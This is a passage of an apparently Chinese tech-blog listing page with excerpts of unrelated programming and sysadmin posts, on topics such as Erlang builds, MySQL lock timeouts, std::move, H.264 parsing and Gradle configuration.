$ yum -y install make ncurses-devel gcc gcc-c++ unixODBC unixODBC-devel openssl openssl-devel 安装后，有部分是更新，有部分是依赖更新，也有的是新安装等等，我的执行后结果如下图：
2.2.3.编译安装Erlang
设置
[root@iZ250x18mnzZ ~]# cd otp_src_17.0 [root@iZ250x18mnzZ ~]# ./configure \ --prefix=/usr/local/erlang \ --enable-smp-support \ --enable-threads \ --enable-sctp \ --enable-kernel-poll \ --enable-hipe \ --with-ssl 上述参数说明： --prefix 指定安装目录
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3522b064bd3b3ffdf3bcdfe66d153b51/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/928b37ad1671dcab14d6f737702d77f0/" rel="bookmark">
			Mysql事物锁等待超时 Lock wait timeout exceeded; try restarting transaction
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		工作中同事遇到此异常，查找解决问题时，收集整理形成此篇文章。
问题场景 问题出现环境： 1、在同一事务内先后对同一条数据进行插入和更新操作； 2、多台服务器操作同一数据库； 3、瞬时出现高并发现象；
不断的有一下异常抛出，异常信息：
org.springframework.dao.CannotAcquireLockException: ### Error updating database. Cause: java.sql.SQLException: Lock wait timeout exceeded; try restarting transaction ### The error may involve com.*.dao.mapper.PhoneFlowMapper.updateByPrimaryKeySelective-Inline ### The error occurred while setting parameters ### SQL:-----后面为SQL语句及堆栈信息-------- 原因分析 在高并发的情况下，Spring事物造成数据库死锁，后续操作超时抛出异常。 Mysql数据库采用InnoDB模式，默认参数:innodb_lock_wait_timeout设置锁等待的时间是50s，一旦数据库锁超过这个时间就会报错。
解决方案 1、通过下面语句查找到为提交事务的数据，kill掉此线程即可。
select * from information_schema.innodb_trx 2、增加锁等待时间，即增大下面配置项参数值，单位为秒（s）
innodb_lock_wait_timeout=500 3、优化存储过程,事务避免过长时间的等待。
参考信息 1、锁等待超时。是当前事务在等待其它事务释放锁资源造成的。可以找出锁资源竞争的表和语句，优化SQL，创建索引等。如果还是不行，可以适当减少并发线程数。 2、事务在等待给某个表加锁时超时，估计是表正被另的进程锁住一直没有释放。 可以用 SHOW INNODB STATUS/G; 看一下锁的情况。 3、搜索解决之道，在管理节点的[ndbd default]区加： TransactionDeadLockDetectionTimeOut=10000（设置 为10秒）默认是1200（1.2秒） 4、InnoDB会自动的检测死锁进行回滚，或者终止死锁的情况。
InnoDB automatically detects transaction deadlocks and rolls back a transaction or transactions to break the deadlock.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/928b37ad1671dcab14d6f737702d77f0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d1be6b8437fd2573df975a261a5212bd/" rel="bookmark">
			erlang中检查内存泄露
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近项目内存占用过多，检查一下erlang的内存使用情况。
1. 通过etop可以很方便得出erlang内存使用的情况
spawn(fun() -&gt; etop:start([{output, text}, {interval, 5}, {lines, 20}, {sort, memory}]) end). 可以定义显示的时间、行数、按照内存使用的大小排列。
2.一般情况etop都能很稳定地工作，但个别极端情况下，etop会使用不了。这个情况下，只能上命令：
RawList = [{Pid, element(2, erlang:process_info (Pid, memory))} || Pid &lt;- processes ()]. SortList = lists:reverse(lists:keysort(2, RawList)). rp(lists:sublist(SortList, 20)). 上面2个方法都可以找出最占用内存的20个进程。
接着我们就可以找出内存的内存情况。
假设一个内存pid为&lt;0.928.0&gt;,在shell终端中使用rp()打印所有信息。
rp(erlang:process_info(pid(0, 928, 0))). 如果进程信息比较大，直接输出到文件：
file:write_file("process_info.txt", [io_lib:format("~p", [erlang:process_info(pid(0, 928, 0))])]). 注意：上面写入文件，如果进程使用的内存过大，会导致上线的项目崩溃，慎用。
上面可以获取到进程的进程字典信息，但进程的状态信息不在这里。
获取进程的状态信息：
rp(erlang:process_info(pid(0, 928, 0), backtrace)). 上面这个方法占用内存很少，可以快速定位进程的当前状态的信息，建议第一时间使用。　转载于:https://www.cnblogs.com/getong/p/5198253.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e183babe9acc91f6a808e661fbbd48ef/" rel="bookmark">
			Hibernate中使用未映射为主键的“id”字段进行查询的场景分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天遇到一个hibernate的问题，有一个实体的主键字段叫userId，数据库里的字段名称是user_id。 然后在某个查询语句里有这样一段代码：
Criterion criterion = Restrictions.eq("id",userId); User user=userDao.findUnique(criterion); 当时看到这段代码的感觉是应该会报错吧，因为这个实体并没有id这个字段，然而事实是不仅可以运行，结果还是正确的。 搜索了下网络，发现有网友遇到类似的问题，但是没有找到问题的原因。原帖如下：
跟踪了一下hibernate的源代码，发现在hibernate启动生成映射关系的时候，会先初始化普通字段的映射关系，再初始化主键字段的映射关系，如下图所示：
而这种主键字段的初始化，也就是initIdentifierPropertyPaths(mapping)这个方法，不仅会生成userId-&gt;user_id的映射关系，还会生成一条id-&gt;user_id到映射关系。
至此，问题的原因已经明朗了，我遇到的问题是因为hibernate自动生成了id的映射，所以可以访问到id属性。而网友的问题则是，hibernate第二步自动生成的id映射关系覆盖了第一步普通属性里id的映射关系。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3c33012f2de9141a7d1865f3a678dcb0/" rel="bookmark">
			JNI配置问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在开发版本中，我们通常打开的jni检查选项，（ro.kernel.android.checkjni= 1），
如果安装的apk不是理智的（不是非常吻合JNI接口的），虚拟机会报出：这不是有效的JNI引用，就会导致虚拟机崩溃，导致apk停止 for the development, we usually open the jni check option (ro.kernel.android.checkjni=1). if the apk native code is not every sanity, vm will tell you that "it's not a valid jni reference" and cause a dalvik crash to stop the apk. nasty log msg: 09-05 10:24:16.129 W/dalvikvm( 1423): JNI WARNING: 0x417d73f8 is not a valid JNI reference 09-05 10:24:16.129 W/dalvikvm( 1423): in Lcom/zeptolab/ctr/CtrRenderer;.nativeTick:(J)V (GetObjectClass) 09-05 10:24:16.129 I/dalvikvm( 1423): "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3c33012f2de9141a7d1865f3a678dcb0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f6b7e338811e0109dd9f2327d9d6df15/" rel="bookmark">
			xz文件的解压和压缩
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 xz这个压缩很多人陌生，xz是绝大数linux默认就带的一个压缩工具，xz格式比7z还要小
方法/步骤 xz压缩文件方法或命令
xz -z 要压缩的文件
如果要保留被压缩的文件加上参数 -k ，如果要设置压缩率加入参数 -0 到 -9调节压缩率。如果不设置，默认压缩等级是6
xz解压文件方法或命令
xz -d 要解压的文件
同样使用 -k 参数来保留被解压缩的文件。
创建或解压tar.xz文件的方法
习惯了 tar czvf 或 tar xzvf 的人可能碰到 tar.xz也会想用单一命令搞定解压或压缩。其实不行 tar里面没有征对xz格式的参数比如 z是针对 gzip，j是针对 bzip2。
创建tar.xz文件：只要先 tar cvf xxx.tar xxx/ 这样创建xxx.tar文件先，然后使用 xz -z xxx.tar 来将 xxx.tar压缩成为 xxx.tar.xz 转自：http://jingyan.baidu.com/article/eae078278688c11fec548531.html 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d87ccf08ffb8f3cae0d97c49ec17ca0b/" rel="bookmark">
			递归归并排序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		/* MergeSort.java CSC 225 - Spring 2016 Assignment 2 - Template for Merge Sort (Linked List version) This template includes some testing code to help verify the implementation. To interactively provide test inputs, run the program with java MergeSort To conveniently test the algorithm with a large input, create a text file containing space-separated integer values and run the program with java MergeSort file.txt where file.txt is replaced by the name of the text file.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d87ccf08ffb8f3cae0d97c49ec17ca0b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/33ea134228f32c900e8290ec9e3a9d78/" rel="bookmark">
			「Blender学习杂记」0. Blender环境设置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		NOTE: 本文由赤石俊哉原创加上部分摘抄翻译自「Blender 3Dキャラクター メイキング・テクニック　Benjamin 著」，个人觉得这本书写的还是不错的，日语好的朋友可以买一本来看看哦。ISBN 978-4-8007-1115-1 C3055 定価（\3200E 本体価格3,200円＋税）
Blender的安装 Blender是开源软件，我们可以直接从官网下载到最新版本，而且免费使用。官网链接 Zip版本解压就可以使用，而且可以在同一个电脑上使用多个版本的Blender。而且比较绿色，不会在控制面板中生成卸载向导，你只需要直接删除解压出来的文件，就能将它从你的电脑上完全移除。 安装版的只需要遵照指示下一步下一步就好啦~ 解压/安装完成之后，在Blender的程序目录中找到blender.exe，运行就好了。
环境设定 默认的Blender是英语界面的，可以改成中文或者日文等多国语言的界面，在以后的文章里面我就用中文版的来写文章了。 首先打开Blender用户设置： 文件 File -&gt; 用户设置 User Prefenrences... Ctrl Alt U 从最上面的面板中进入系统 System标签。 勾选右下角的国际化字体 International Fonts， 在出现的Language 语言：后面的选项中选择简体中文（简体中文） 下面的翻译中选择界面和工具提示。 需要注意的是，如果新建数据也勾选的话，下次新建的工程名就会是中文的了，所以这个不需要勾选。
DPI设置 如果你使用的是高分屏，可以通过调节DPI来调整UI的显示大小。 首先打开用户设置面板，在系统选项卡中，找到左上角的 常项 -&gt; DPI 设置后面的数字来调节。
模拟鼠标中键 如果你使用的双键鼠标，没有滚轮，或者滚轮按不下去的那种，那么你可以通过Alt + 鼠标左键来模拟鼠标中键。 打开用户设置面板，在输入选项卡中，找到 鼠标 -&gt; 模拟3键鼠标 勾选他就行了。
用数字键模拟小键盘 如果你使用的是80%以下的键盘或者是笔记本，没有小键盘的话，或许你就会需要使用数字键来模拟小键盘上的1~0键了。 打开用户设置面板，在输入选项卡中找到 模拟数字键盘 勾选他就行了。
设置完之后别忘了点击保存用户设置哦！！！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/562f4617f435f15cedceab29972c0770/" rel="bookmark">
			item 23: 理解std::move和std::forward
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文翻译自《effective modern C++》，由于水平有限，故无法保证翻译完全正确，欢迎指出错误。谢谢！
博客已经迁移到这里啦 根据std::move和std::forward不能做什么来熟悉它们是一个好办法。std::move没有move任何东西，std::forward没有转发任何东西。在运行期，它们没有做任何事情。它们没有产生需要执行的代码，一byte都没有。
std::move和std::forward只不过就是执行cast的两个函数（实际上是函数模板）。std::move无条件地把它的参数转换成一个右值，而std::forward只在特定条件满足的情况下执行这个转换。就是这样了，我的解释又引申出一系列的新问题，但是，基本上来说，上面说的就是全部内容了。
为了让内容更加形象，这里给出C++11中std::move实现的一个例子。它没有完全遵循标准的细节，但是很接近了。
template&lt;typename T&gt; //在命名空间std中 typename remove_reference&lt;T&gt;::type&amp;&amp; move(T&amp;&amp; param) { using ReturnType = //别名声明 typename remove_reference&lt;T&gt;::type&amp;&amp;; //看Item 9 return static_cast&lt;ReturnType&gt;(param); } 我已经帮你把代码的两个部分高亮（move和static_cast）显示了。一个是函数的名字，因为返回值类型挺复杂的，我不想让你在这复杂的地方浪费时间。另一个地方是包括了这个函数的本质（cast）。就像你看到的那样，std::move需要一个对象的引用（准确地说是一个universal引用，看Item 24），并且返回同一个对象的引用。
函数返回值类型的“&amp;&amp;”部分暗示了std::move返回一个右值引用，但是，就像Item 28解释的那样，如果类型T恰好是左值引用，T&amp;&amp;将成为一个左值引用。为了防止这样的事情发生，type trait（看Item 9）std::remove_reference被用在T上了，因此能保证把“&amp;&amp;”加在不是引用的类型上。这样能保证让std::move确切地返回一个右值引用，并且这是很重要的，因为由函数返回的右值引用是一个右值。因此，std::move所做的所有事情就是转换它的参数为一个右值。
说句题外话，在C++14中std::move能被实现得更简便一些。多亏了函数返回值类型推导（看Item 3）以及标准库的别名模板std::remove_reference_t（看Item 9），std::move能被写成这样：
template&lt;typename T&gt; decltype(auto) move(T&amp;&amp; param) { using ReturnType = remove_reference_t&lt;T&gt;&amp;&amp;; return static_cast&lt;ReturnType&gt;(param); } 看上去更简单了，不是吗？
因为std::move值只转换它的参数为右值，这里有一些更好的名字，比如说rvalue_cast。尽管如此，我们仍然使用std::move作为它的名字，所以记住std::move做了什么和没做什么很重要。它做的是转换，没有做move。
当然了，右值是move的候选人，所以把std::move应用在对象上能告诉编译器，这个对象是有资格被move的。这也就是为什么std::move有这样的名字：能让指定的对象更容易被move。
事实上，右值是move的唯一候选人。假设你写了一个代表注释的类。这个类的构造函数有一个std::string的参数，并且它拷贝参数到一个数据成员中。根据Item 41中的信息，你声明一个传值的参数：
class Annotation { public: explicit Annotation(std::string text); // 要被拷贝的参数 // 根据Item 41，声明为传值的 ... }; 但是Annotation的构造函数只需要读取text的值。它不需要修改它。为了符合历史传统（把const用在任何可以使用的地方），你修改了你的声明，因此text成为了const的：
class Annotation { public: explicit Annotation(const std::string text) .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/562f4617f435f15cedceab29972c0770/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0619b5aa5e4c090a3c80367449bc2467/" rel="bookmark">
			基于Tcp协议与基于Http协议的RPC简介笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言：之前对于RPC方面的学习多限于对RMI原理的学习，直到今天在看陈康贤前辈的《大型分布式网站架构-设计与实践》这本书的时候，才发现原来RPC可以基于TCP协议也可以基于HTTP协议（这里所说的TCP协议与HTTP协议更多的是指服务的消费者与远端的提供方的一种连接或消息传送形式），在此就简单记录一下，作为之后研究其它类似框架的基础。
RPC全称Remote Process Call，即远程过程调用，其在服务的调用方与服务的提供方的调用大致如下图所示（左边为一对一，右边为多对多）。在理解PRC基于这两种协议前，首先要明确RPC的主要目的只是获取由远程机器上的程序所执行的结果。
在Java中，可以利用Socket API实现基于TCP协议的RPC调用，由服务的调用方与服务的提供方建立Socket连接，并由服务的调用方通过Socket将需要调用的接口名称、方法名称和参数序列化后传递给服务的提供方，服务的提供方反序列化后再利用反射调用相关的方法，最后将结果返回给服务的调用方。整个基于TCP协议的PRC调用大致如此，但是在实例应用中则会进行一系列的封装，譬如RMI便是在TCP协议上传递可序列化的java对象。
而基于HTTP协议的RPC调用则更像是我们访问网页一样，只是它的返回结果更加单一简单。其大致流程为：由服务的调用者向服务的提供者发送请求，这种请求的方式可能是GET、POST、PUT、DELETE等中的一种（服务的提供者可能会根据不同的请求方式做出不同的处理，或者某个方法只允许某种请求方式），而调用的具体方法则根据URL进行方法调用，而方法所需参数则可能是对服务调用方传输过去的XML数据或JSON数据解析后的结果，最后返回JOSN或XML的数据结果（这需要根据实际应用定义相关的协议）。由于目前有很多开源的WEB服务器，如Tomcat，JBoss等，所以其实现起来更加容易（就跟做Web项目一样）。
而基于TCP协议实现的RPC调用，由于TCP协议处于协议栈的下层，能够更加灵活地对协议字段进行定制，减少网络开销，提高性能，实现更大的吞吐量和并发数。但是需要更多地关注底层复杂的细节，实现的代价更高。同时对于不同平台（如安卓、IOS等），需要重新开发出不同的工具包来进行请求发送和响应解析，工作量大，难以快速响应和满足 用户需求。
基于HTTP协议实现的RPC则可以使用JSON和XML格式的请求或响应数据，而JSON和XML作为通用的格式标准，开源的解析工具已经相当成熟，在其上进行二次开发会非常便捷和简单。但是由于HTTP协议是上层协议，发送包含同等内容的信息，使用HTTP协议传输所占用的字节数会比使用TCP协议传输所占用的字节数更高。因此，同等网络环境下，通过HTTP协议传输相同内容，效率会比基于TCP协议的数据效率要低，信息传输所占的时间也会更长，当然使用gzip压缩数据，能够缩小这一差距。
**注：**以上仅为个人笔记，未作详细分析，甚至由于个人知识面的不足，会显得特别粗糙，如有错误或不当的地方，还请指正。另外，本文后两段摘抄至陈康贤前辈的《大型分布式网站架构-设计与实践》，如需了解更多详细内容，请阅读原书。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a79b42d33cffcdaf3343c411579798c5/" rel="bookmark">
			Makefile规则
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先讲一下 gcc g++编译器 gcc -c aa.o aa.c (c文件编译） gcc -o main aa.o aaa.a (编译成可执行文件，同时依赖静态库）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/49e08d61af9806a05c86b14eede50397/" rel="bookmark">
			csdn初学
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		http://blog.csdn.net/myarrow/article/details/27049673
;; 关闭工具栏，tool-bar-mode 即为一个 Minor Mode
;; Added by Package.el. This must come before configurations of
;; installed packages. Don't delete this line. If you don't want it,
;; just comment it out by adding a semicolon to the start of the line.
;; You may delete these explanatory comments.
;;(package-initialize)
;(add-to-list 'load-path "/Users/tinyult/.emacs.d/elpa")
;(add-to-list 'load-path "/Users/tinyult/Documents/Go/gocodea")
(when (&gt;= emacs-major-version 24)
(require 'package)
(package-initialize)
(add-to-list 'package-archives '("melpa" . "http://melpa.org/packages/") t)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/49e08d61af9806a05c86b14eede50397/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9e160b778b9c207a3bb771b3c8f92f59/" rel="bookmark">
			视音频数据处理入门：H.264视频码流解析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		=====================================================
视音频数据处理入门系列文章：
视音频数据处理入门：RGB、YUV像素数据处理
视音频数据处理入门：PCM音频采样数据处理
视音频数据处理入门：H.264视频码流解析
视音频数据处理入门：AAC音频码流解析
视音频数据处理入门：FLV封装格式解析
视音频数据处理入门：UDP-RTP协议解析
=====================================================
前两篇文章介绍的YUV/RGB处理程序以及PCM处理程序都属于视音频原始数据的处理程序。从本文开始介绍视音频码流的处理程序。本文介绍的程序是视频码流处理程序。视频码流在视频播放器中的位置如下所示。
本文中的程序是一个H.264码流解析程序。该程序可以从H.264码流中分析得到它的基本单元NALU，并且可以简单解析NALU首部的字段。通过修改该程序可以实现不同的H.264码流处理功能。
原理 H.264原始码流（又称为“裸流”）是由一个一个的NALU组成的。他们的结构如下图所示。
其中每个NALU之间通过startcode（起始码）进行分隔，起始码分成两种：0x000001（3Byte）或者0x00000001（4Byte）。如果NALU对应的Slice为一帧的开始就用0x00000001，否则就用0x000001。 H.264码流解析的步骤就是首先从码流中搜索0x000001和0x00000001，分离出NALU；然后再分析NALU的各个字段。本文的程序即实现了上述的两个步骤。
代码整个程序位于simplest_h264_parser()函数中，如下所示。 /** * 最简单的视音频数据处理示例 * Simplest MediaData Test * * 雷霄骅 Lei Xiaohua * leixiaohua1020@126.com * 中国传媒大学/数字电视技术 * Communication University of China / Digital TV Technology * http://blog.csdn.net/leixiaohua1020 * * 本项目包含如下几种视音频测试示例： * (1)像素数据处理程序。包含RGB和YUV像素格式处理的函数。 * (2)音频采样数据处理程序。包含PCM音频采样格式处理的函数。 * (3)H.264码流分析程序。可以分离并解析NALU。 * (4)AAC码流分析程序。可以分离并解析ADTS帧。 * (5)FLV封装格式分析程序。可以将FLV中的MP3音频码流分离出来。 * (6)UDP-RTP协议分析程序。可以将分析UDP/RTP/MPEG-TS数据包。 * * This project contains following samples to handling multimedia data: * (1) Video pixel data handling program.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9e160b778b9c207a3bb771b3c8f92f59/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b7fd893175af60ce000f50a2b35faef9/" rel="bookmark">
			Go语言圣经（中文版）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		https://github.com/golang-china/gopl-zh // github地址
https://books.studygolang.com/gopl-zh/ // 2017年版本页面
https://docs.hundan.org/gopl-zh/ 最新版页面
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6eae784547c47b2493ee2d00aeace945/" rel="bookmark">
			linux shell 常用表达式汇总
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. linux shell 逻辑运算符、逻辑表达式详解： http://www.cnblogs.com/chengmo/archive/2010/10/01/1839942.html
转载于:https://www.cnblogs.com/yaozhongxiao/p/5168722.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0866205c51394cb773735f508450489b/" rel="bookmark">
			idea点击&#43;号没有tomcat插件解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 查看配置文件/Users/***/Library/Preferences/IntelliJIdea15/disabled_plugins.txt中有没有tomcat，如果有，删除即可。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8e978b9c9f7ce59618cec512246ec559/" rel="bookmark">
			解决华为荣耀6连接电脑时，找不到“USB连接方式”的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		华为荣耀6与电脑连接时，一般会跳出“USB连接方式”供用户选择。如下图所示：
现在与电脑连接时，手机不会跳出“USB连接方式”，只会充电，无法拷贝文件到手机内存。
原因：有一次将连接方式改成【仅充电】选项，并点了不再提示。
解决方法：
1.插好数据线,拨号界面 输入 *#*#2846579#*#* 进入工程模式
2.projectmenu→后台设置→USB端口配置→选择google模式,点确定
3.不要拔线,退出工程模式,直接重启手机,可以看到可以下拉的USB选项“USB连接方式”，选择“U盘存储”，就可以拷贝数据到手机内存了，同时不勾选【不再提示】选项，这样以后每次连接都会提示用户选择连接方式。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bedb1326ac223ccd1ebd8a50b16b377c/" rel="bookmark">
			error: Error parsing XML: not well-formed (invalid token)解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		从另一个工程中拷贝代码到新的工程后，编译出现了error: Error parsing XML: not well-formed (invalid token)错误，刚开始不清楚怎么解决。重新拷贝编译，也还是同样的问题。后来进入到工程中对相应的.xml文件cat看了下，发现里边全部是一些二进制的信息或者乱码。
这才发现问题所在，改用ftp服务器上传的方式后问题解决。
同类的问题，如果有格式方面的问题的话，一般都是拷贝前和拷贝后的文件格式不一致，文件内容发生了错乱导致的。平时用cp命令拷贝或者ftp服务这样的拷贝方式会相对来说好一些，不容易出现错误。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/252bc7f0bb30306cf36d834785ceec87/" rel="bookmark">
			c3p0 数据库连接池 出错总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 Could not resolve placeholder '*' in string value "${*}" 出现这种错误，我个人遇到过三种情况 (1).在*.properties 属性文件中，名称是否与applicationcontext.xml 中的文件名称是否一致 (2).是否有properties 属性文件，存在该名称 。
(3).在applicationContext.xml 中 是否有加 (4). 重复的配置比如：如下配置一，配置二同时出现，这样重复配置导致出错。
配置一
&lt;context:property-placeholder /&gt; 配置二 &lt;bean id="propertyConfigurer" class="org.springframework.beans.factory.config.PropertyPlaceholderConfigurer"&gt; &lt;property name="locations"&gt; &lt;list&gt; &lt;value&gt;classpath:xml/jdbc.properties&lt;/value&gt; &lt;/list&gt; &lt;/property&gt; &lt;property name="ignoreUnresolvablePlaceholders" value="true" /&gt; &lt;property name="fileEncoding"&gt; &lt;value&gt;UTF-8&lt;/value&gt; &lt;/property&gt; &lt;/bean&gt; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3b252ae5e00e986d1e2e83f576724722/" rel="bookmark">
			VNC 修改默认端口号
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		vnc的默认端口是5901，这个说法是不对的。vnc并不是只有一个端口。 以前另一个文章介绍了nvcserver的配置用户的过程，里面提到了桌面号，这个桌面号就可以端口有密切关系 先看看这个配置 VNCSERVERS="1:oracle 2:root" VNCSERVERARGS[1]="-geometry 800x600 -nolisten tcp -nohttpd" ...... 这里是摘自/etc/sysconfig/vncservers里的一段。 这里就配置了2个桌面，一个桌面号是1， 一个是2. vncserver在调用的时候，会根据你的配置来启用server端的监听端口， 从5900开始，加上你的桌面号，比如这里的哦oracle就是5901，root就是5902 所以通过这里的桌面号也是可以达到我们的目的的,根据你的目标端口来设定用户的周面好，虽然可以解决，但是总是感觉有些没有拉干净的感觉，这不是 这次的研究内容，还是找个痛快的方式吧。 这次的研究主要就是颠覆这样的默认规则，直接的深入进去，我要直接修改5900+为15900+ 在网上没有找到比较好的方法和文档，自己动手吧 从vncserver这个启动命令开始吧， [root@redflag1 ~]# which vncserver /usr/bin/vncserver [root@redflag1 ~]# file /usr/bin/vncserver /usr/bin/vncserver: a perl script text executable [root@redflag1 ~]# grep "59" /usr/bin/vncserver -n 18:# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, 118:$vncPort = 5900 + $displayNumber; 238:# n is taken if something is listening on the VNC server port (5900+n) or the 257:# (5900+n) or the X server port (6000+n).
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3b252ae5e00e986d1e2e83f576724722/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/324ec9773b1ba82ba061138d52ca5722/" rel="bookmark">
			fresco如何配合PhotoView使用实现图片缩放
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这里有两种方法：
第一种：修改photoview
https://github.com/ongakuer/PhotoDraweeView
第二种：继承photoview，自定义DraweeView
https://github.com/biezhihua/MySimpleDraweeView
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fd459a0a56fd4c9e2ec791b543458bc5/" rel="bookmark">
			js数字金额格式转换函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		/*数字与金额转换,四位隔开*/ function fmoney(s, n) //s:传入的float数字 ，n:希望返回小数点几位 { n = n &gt; 0 &amp;&amp; n &lt;= 20 ? n : 2; s = parseFloat((s + "").replace(/[^\d\.-]/g, "")).toFixed(n) + ""; var l = s.split(".")[0].split("").reverse(), r = s.split(".")[1]; t = ""; for(i = 0; i &lt; l.length; i ++ ) { t += l[i] + ((i + 1) % 4 == 0 &amp;&amp; (i + 1) != l.length ? "," : ""); } return t.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fd459a0a56fd4c9e2ec791b543458bc5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/36de0f002b14de950d7d3aa5b6fc8ec5/" rel="bookmark">
			关于Android Studio里的Gradle，你所需要知道的都在这里了
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 你是不是有这种感觉，每当你使用Android Studio的时候，总会被她的优雅和便捷深深的吸引，但是一旦打开build.gradle文件就有一种想死的冲动，这尼玛都是什么啊，老子看不懂啦(ノಠ益ಠ)ノ彡┻━┻ ，不要着急，这篇文章就是来解救你的，看完这篇文章，你的种种疑问都会迎刃而解，从此与Android Studio过上快乐幸福的生活。（大雾→_→）
Gradle介绍 Gradle是一个先进的build toolkit，可以方便的管理依赖包和定义自己的build逻辑。到底有多先进，Android Studio官方集成Gradle，Google还专门写了Android Plugin for Gradle，你们感受一下。
基础配置 Android Studio中有一个顶级的build.gradle文件，每一个module还有一个自己的build.gradle。这个文件是使用Groovy语法和Android Plugin for Gradle元素的配置文件。通常我们只需要修改module的build文件就可以了。 下面是一个简单的例子
&lt;code class="hljs rust has-numbering"&gt;apply plugin: &lt;span class="hljs-string"&gt;'com.android.application'&lt;/span&gt; android { compileSdkVersion &lt;span class="hljs-number"&gt;19&lt;/span&gt; buildToolsVersion &lt;span class="hljs-string"&gt;"19.0.0"&lt;/span&gt; defaultConfig { applicationId &lt;span class="hljs-string"&gt;"com.example.my.app"&lt;/span&gt; minSdkVersion &lt;span class="hljs-number"&gt;8&lt;/span&gt; targetSdkVersion &lt;span class="hljs-number"&gt;19&lt;/span&gt; versionCode &lt;span class="hljs-number"&gt;1&lt;/span&gt; versionName &lt;span class="hljs-string"&gt;"1.0"&lt;/span&gt; } buildTypes { release { minifyEnabled &lt;span class="hljs-keyword"&gt;true&lt;/span&gt; proguardFiles getDefaultProguardFile(&lt;span class="hljs-string"&gt;'proguard-android.txt'&lt;/span&gt;), &lt;span class="hljs-string"&gt;'proguard-rules.pro'&lt;/span&gt; } } } dependencies { &lt;span class="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/36de0f002b14de950d7d3aa5b6fc8ec5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
